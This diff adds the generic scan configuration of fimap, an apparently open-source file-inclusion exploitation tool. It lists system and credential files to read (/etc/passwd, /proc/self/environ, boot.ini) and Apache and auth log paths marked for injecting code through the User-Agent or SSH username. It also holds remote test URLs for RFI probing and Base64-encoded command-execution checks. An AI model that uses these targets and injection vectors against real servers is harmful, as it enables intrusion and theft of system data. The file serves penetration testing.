@@ -1,0 +1,117 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<fimap language="generic" revision="3">
+    <!-- WTF is this file?
+            This file describes the basic scan parameters of fimap.
+            You can add much more files but read this facts:
+             * relative_files are files which *can* described in a relative way. So if it *is* possible the file goes here.
+             * absolute_files are files which can *only* described in a absolute way. (Say hello to php://input)
+             * log_files are files which need a special action to inject code into it.
+             * blind_files are files which should be searched in blindmode.
+             * remote_files are files which are used to scan for RFIs if you have disabled dynamic_rfi. You have
+               more success here if you add multiple sites with different suffixes. Like .php .html .htm
+               This is because if the truncation methods fails (NullByte\DotTrunc) then you can still scan for at least some suffixes.
+               fimap actually takes care of the suffix. So if the suffixes match fimap will truncate the injection so the file fits perfectly.
+            
+            As you can see every file has also some parameters. Here are what there are good for:
+             * find: This parameter is used to see if the file actually got included. So define here something you except to see.
+             * unix: Set this to "1" if this file is available on unixoid systems.
+             * windows: Set this to "1" if this file is available on windows systems. 
+             * flags: There are different kind of flags to tell the exploit engine how to hax this file. Here we go:
+               * r = This file is readable. Means we can include it and print it's content somehow.
+               * R = This file is a RFI. Exploit engine will use dynamic_rfi to exploit it.
+               * x = This flag says that this file can be used to inject payloads.
+               * A = This file supports direct injection through the UserAgent. (/proc/self/environ says hello)
+               * L = This file is a logfile. You have to combine it with one of the following options.
+                     * H = The exploit engine should inject the kickstarter through the UserAgent.
+                     * S = The exploit engine should inject the kickstarter through the SSH UserName.
+                     * F = The exploit engine should inject the kickstarter through the FTP UserName.
+             
+             It's up to you to combine the flags so that it hits the nail ;)
+             
+             You will find also the same stuff inside the php.xml and perl.xml. The files you define there are exclusivly for the language.
+             
+             The other values are trivial. If you are smart enough you can see what they are doing.
+             Just for your information. The weird alphanummeric combinations are Base64 encoded strings.
+    -->
+
+	<relative_files>
+		<file path="/etc/passwd" find="root:" flags="r" unix="1" windows="0"/>
+		<file path="c:\boot.ini" find="[operating" flags="r" unix="0" windows="1"/>
+		<file path="/proc/self/environ" find="HTTP_USER_AGENT=" flags="rxA" unix="1" windows="0"/>
+		<file path="c:\windows\win.ini" find="[fonts" flags="r" unix="0" windows="1"/>
+	</relative_files>
+	
+	<absolute_files>
+	</absolute_files>
+	
+	<remote_files>
+	</remote_files>
+	
+	<log_files>
+		<file path="/var/log/apache2/access.log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/var/log/apache/access.log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/var/log/httpd/access.log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/var/log/apache2/access_log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/var/log/apache/access_log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/var/log/httpd/access_log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/apache/logs/access.log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/apache/logs/access_log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/apache2/logs/access.log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/apache2/logs/access_log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/etc/httpd/logs/access_log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/etc/httpd/logs/access.log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/var/httpd/logs/access_log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/var/httpd/logs/access.log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/var/www/logs/access_log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/var/www/logs/access.log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/usr/local/apache/logs/access_log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/usr/local/apache/logs/access.log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/usr/local/apache2/logs/access_log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/usr/local/apache2/logs/access.log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/var/log/access_log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/var/log/access.log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/logs/access.log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/logs/access_log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/opt/lampp/logs/access_log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/opt/lampp/logs/access.log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/opt/xampp/logs/access.log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/opt/xampp/logs/access_log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="C:\Program Files\Apache Group\Apache\logs\access.log" find='"GET /' flags="LHx" unix="0" windows="1" />
+		<file path="C:\Program Files\Apache Group\Apache\logs\access_log" find='"GET /' flags="LHx" unix="0" windows="1" />
+		<file path="/var/log/auth.log" find=' session ' flags="LSx" unix="1" windows="0" />
+		<file path="/var/log/secure" find=' session ' flags="LSx" unix="1" windows="0" />
+	</log_files>
+	
+	<blind_files mindepth="0" maxdepth="15">
+		<file path="/etc/passwd" find="root:" flags="r" unix="1" windows="0"/>
+		<file path="c:\boot.ini" find="[operating" flags="r" unix="0" windows="1"/>
+		<file path="c:\windows\win.ini" find="[fonts" flags="r" unix="0" windows="1"/>
+                <file path="http://www.tha-imax.de/fimap_testfiles/test" find="This is the right thing." flags="rR" unix="1" windows="1"/>
+                <file path="http://www.tha-imax.de/fimap_testfiles/test.php" find="This is the right thing." flags="rR" unix="1" windows="1"/>
+                <file path="http://www.tha-imax.de/fimap_testfiles/test.html" find="This is the right thing." flags="rR" unix="1" windows="1"/>
+                <file path="http://www.tha-imax.de/fimap_testfiles/test.inc" find="This is the right thing." flags="rR" unix="1" windows="1"/>
+        </blind_files>
+	<methods>
+		<unix concatcommand=";">
+			<shellquiz source="cm5kMSA9IHJhbmRvbS5yYW5kcmFuZ2UoMTAsIDk5KQpybmQyID0gcmFuZG9tLnJhbmRyYW5nZSgxMCwgOTkpCnJlc3VsdCA9IHN0cihybmQxICogcm5kMikKc2hlbGxjb2RlID0gImVjaG8gJCgoJWQqJWQpKSIlKHJuZDEsIHJuZDIpCnJldCA9IChzaGVsbGNvZGUsIHJlc3VsdCk=" />
+			<kernelversion source="uname -r -s" />
+			<currentdir source="pwd" />
+			<currentuser source="whoami" />
+			<cd source="cd '__DIR__'" />
+		</unix>
+		
+		<windows concatcommand="&amp;">
+			<shellquiz source="cm5kMSA9IHJhbmRvbS5yYW5kcmFuZ2UoMTAsIDk5KQpybmQyID0gcmFuZG9tLnJhbmRyYW5nZSgxMCwgOTkpCnJlc3VsdCA9IHN0cihybmQxICogcm5kMikKc2hlbGxjb2RlID0gInNldCAvYSAlZColZCIlKHJuZDEsIHJuZDIpCnJldCA9IChzaGVsbGNvZGUsIHJlc3VsdCkK" />
+			<kernelversion source="ver" />
+			<currentdir source="chdir" />
+			<currentuser source="echo %USERNAME%" />
+			<cd source='cd "__DIR__"' /> 
+		</windows>
+	</methods>
+	
+	
+	<languagesets>
+		<language name="PHP" langfile="php.xml" /> 
+		<language name="Perl" langfile="perl.xml" />
+	</languagesets>
+</fimap>
